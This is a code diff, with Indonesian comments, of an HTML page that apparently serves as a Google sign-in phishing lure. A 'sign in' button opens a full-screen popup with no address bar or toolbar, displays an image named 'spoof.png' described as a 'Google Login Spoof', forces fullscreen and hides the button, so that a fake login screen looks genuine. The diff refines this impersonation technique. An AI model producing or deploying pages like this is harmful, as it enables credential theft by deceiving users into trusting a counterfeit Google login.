@@ -11,7 +11,7 @@
             height: 100%;
             width: 100%;
             overflow: hidden;
-            background: #fff; /* Awalnya putih kosong */
+            background: #fff;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -24,6 +24,7 @@
             position: absolute;
             top: 0;
             left: 0;
+            z-index: 1;
         }
         .signin-link {
             padding: 20px 40px;
@@ -34,36 +35,44 @@
             border-radius: 4px;
             cursor: pointer;
             z-index: 10;
+            position: relative; /* Agar bisa disembunyikan dengan lancar */
         }
     </style>
-<script>
-    function goFullscreen() {
-        var elem = document.documentElement;
-        if (elem.requestFullscreen) elem.requestFullscreen();
-        else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-        else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
-        else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
-    }
-
-    function openWin() {
-        // Buka popup besar tanpa toolbar
-        var params = 'width=' + screen.width +
-                     ',height=' + screen.height +
-                     ',top=0,left=0' +
-                     ',menubar=no,toolbar=no,location=no,status=no,scrollbars=no,resizable=no';
-
-        var win = window.open("opener.html", "google_signin", params);
-        if (win) {
-            win.moveTo(0, 0);
-            win.resizeTo(screen.width, screen.height);
-            win.focus();
+    <script>
+        function goFullscreen() {
+            var elem = document.documentElement;
+            if (elem.requestFullscreen) elem.requestFullscreen();
+            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+            else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
+            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
         }
 
-        // Langsung fullscreen main window + tampilkan spoof.png
-        document.getElementById('spoof-img').style.display = 'block';
-        goFullscreen();
-    }
-</script>
+        function openWin() {
+            // Buka popup hampir fullscreen
+            var params = 'width=' + screen.width +
+                         ',height=' + screen.height +
+                         ',top=0,left=0' +
+                         ',menubar=no,toolbar=no,location=no,status=no,scrollbars=no,resizable=no';
+
+            var win = window.open("opener.html", "google_signin", params);
+            if (win) {
+                win.moveTo(0, 0);
+                win.resizeTo(screen.width, screen.height);
+                win.focus();
+            }
+
+            // Tampilkan gambar spoof.png langsung
+            document.getElementById('spoof-img').style.display = 'block';
+
+            // Sembunyikan tombol setelah 1 detik
+            setTimeout(function() {
+                document.querySelector('.signin-link').style.display = 'none';
+            }, 1000);
+
+            // Coba fullscreen
+            goFullscreen();
+        }
+    </script>
 </head>
 <body>
     <!-- Tombol awal -->
@@ -71,7 +80,7 @@
         Click here to sign in into your Google Account v2
     </a>
 
-    <!-- spoof.png akan muncul setelah 2 detik -->
+    <!-- spoof.png akan muncul langsung setelah klik -->
     <img id="spoof-img" src="spoof.png" alt="Google Login Spoof">
 </body>
 </html>
